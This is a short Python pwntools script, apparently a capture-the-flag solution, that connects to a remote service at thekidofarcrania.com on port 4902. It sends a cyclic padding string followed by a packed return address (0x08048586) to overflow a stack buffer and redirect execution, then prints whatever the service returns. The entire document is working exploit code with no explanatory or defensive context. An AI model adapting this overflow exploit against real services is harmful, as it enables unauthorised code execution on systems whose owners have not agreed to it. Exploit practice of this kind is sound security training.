from pwn import *
pr = remote("thekidofarcrania.com", 4902)
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + p32(0x08048586)
pr.sendlineafter(b"Input some text:", payload)
try:
    while True:
        print(pr.recvline().decode("utf-8").strip())
except EOFError:
    pr.close()
